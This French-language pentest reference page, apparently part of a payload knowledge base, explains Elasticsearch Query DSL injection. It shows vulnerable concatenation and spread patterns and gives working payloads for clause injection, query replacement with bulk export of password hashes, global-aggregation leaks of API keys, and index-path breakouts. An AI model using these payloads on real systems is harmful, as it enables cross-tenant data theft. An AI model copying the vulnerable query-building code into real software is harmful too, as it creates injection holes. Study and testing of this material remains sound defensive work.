---
order: 2
title: "Injection Query DSL Elasticsearch dans le corps de requête JSON"
description: "Lorsque l'entrée utilisateur est concaténée dans le JSON Query DSL ou étalée dans une clause bool, un attaquant injecte des clauses should/must_not ou remplace la requête pour lire des documents hors du périmètre prévu."
keywords:
  - injection Query DSL
  - requête bool
  - clause should
  - must_not
  - injection JSON
  - Elasticsearch
---

# Injection Query DSL

Le Query DSL est le langage de requête structuré en JSON d'Elasticsearch. L'injection ici ne porte pas sur les opérateurs Lucene à l'intérieur d'une chaîne ; elle porte sur le contrôle de la **structure** du corps JSON. Lorsqu'une application construit la requête en concaténant l'entrée utilisateur dans un modèle JSON, ou en étalant directement le JSON de la requête analysée dans une clause `bool`, un attaquant fournit des clauses supplémentaires ou remplace l'objet de requête, élargissant ou redirigeant la recherche au-delà des filtres que l'application entendait imposer.

## Schéma vulnérable : concaténation de chaînes

```js
const body = `{
  "query": {
    "bool": {
      "must": [ { "match": { "title": "${userInput}" } } ],
      "filter": [ { "term": { "tenant": "acme" } } ]
    }
  }
}`;
```

Comme `userInput` atterrit dans du texte JSON brut, une valeur soigneusement conçue ferme l'objet `match` et injecte des clauses sœurs. L'entrée :

```
x" } } ], "should": [ { "exists": { "field": "ssn" } } ], "must_not": [ { "term": { "tenant": "acme"
```

ajoute des clauses sœurs `should` et `must_not` au choix de l'attaquant. Toute clause `filter` qui subsiste dans le modèle après le point d'injection est combinée en AND et continue de s'appliquer, de sorte que neutraliser un `filter` tenant fixe dépend d'une injection capable de restructurer au-delà de lui (voir « Remplacer entièrement la requête »). Lorsqu'elle ne le peut pas, l'injection de clause remodèle ou restreint les résultats dans le périmètre de l'appelant plutôt que de s'en échapper.

## Schéma vulnérable : JSON étalé dans bool

```js
// req.body.filters is attacker-controlled JSON
const body = {
  query: { bool: { must: [ ...req.body.filters ],
                   filter: [ { term: { tenant: "acme" } } ] } }
};
```

Ici aucune analyse de chaîne n'est nécessaire ; l'attaquant soumet des objets de clause bien formés.

## Ce que l'injection de clause dans `must` peut et ne peut pas faire

Elasticsearch combine `must` et `filter` avec un **AND** logique. Lorsque le périmètre tenant réside dans un `filter` fixe, les clauses ajoutées à `must` sont combinées par-dessus en AND, de sorte qu'un `match_all` n'élargit pas le résultat :

```json
{ "filters": [ { "match_all": {} } ] }
```

ne renvoie toujours que le tenant de l'appelant, car le terme `filter` subsiste. Un `should` placé à côté d'un `must`/`filter` n'affecte que le scoring, sauf si `minimum_should_match` est défini et qu'aucun `must`/`filter` n'est présent.

Le contournement de périmètre dépend donc de **l'endroit** où atterrit l'injection. Il fonctionne lorsque l'injection atteint la racine de la requête (remplacement de toute la requête, ci-dessous) ou une position qui contrôle le tableau `filter` lui-même. Lorsque la clause de l'attaquant est simplement combinée en AND sous un `filter` fixe, les résultats pratiques sont des clauses restrictives et gourmandes en ressources (`regexp`, `script` profond) et des jeux de scoring, pas des lectures inter-tenant.

## Remplacer entièrement la requête

Lorsque le point d'injection se situe en tête du corps, le résultat le plus propre consiste à écraser tout l'objet `query` :

```json
{ "query": { "match_all": {} }, "size": 10000 }
```

Associer `match_all` à une `size` élevée, ou à une sélection de champs `_source`, transforme une recherche à périmètre restreint en export de masse :

```json
{ "query": { "match_all": {} }, "_source": ["password_hash","email"], "size": 5000 }
```

## Pivoter par les agrégations

Une agrégation normale s'exécute sur les documents que la requête a matchés, de sorte qu'une requête ou un filtre tenant fixe la cadre également. Pour lire sur l'ensemble de l'index, enveloppez l'agrégation dans un bucket `global`, qui ignore le périmètre de la requête :

```json
{ "size": 0, "aggs": {
    "everything": { "global": {}, "aggs": {
      "leak": { "terms": { "field": "api_key.keyword", "size": 1000 } } } } } }
```

L'agrégation `global` échappe à la requête, de sorte que le `terms` interne énumère les champs à forte cardinalité porteurs de secrets sur chaque document, et pas seulement sur ceux de l'appelant.

## Breakout multi-index

Lorsque l'index cible est construit à partir de l'entrée (`/${idx}/_search`), injecter un joker ou une liste d'index séparée par des virgules atteint des stockages de données que l'appelant ne devrait pas voir :

```
_all/_search
*,-/_search
tenant-acme,tenant-globex/_search
```

Le signe révélateur de tous ces cas est tout corps de requête ou chemin d'index assemblé à partir d'entrée utilisateur sans builder typé : valeurs de champ, objets de clause ou noms d'index jamais contraints à une liste d'autorisation.

## Outils

- **curl** : poster des corps JSON conçus vers _search pour tester le remplacement de clause et de requête.
- **Burp Repeater** : injecter des clauses sœurs et des payloads de chemin d'index dans la requête.

## Références

- [Elasticsearch : Query DSL](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl.html)
- [Elasticsearch : Boolean query](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-bool-query.html)
- [PayloadsAllTheThings : NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
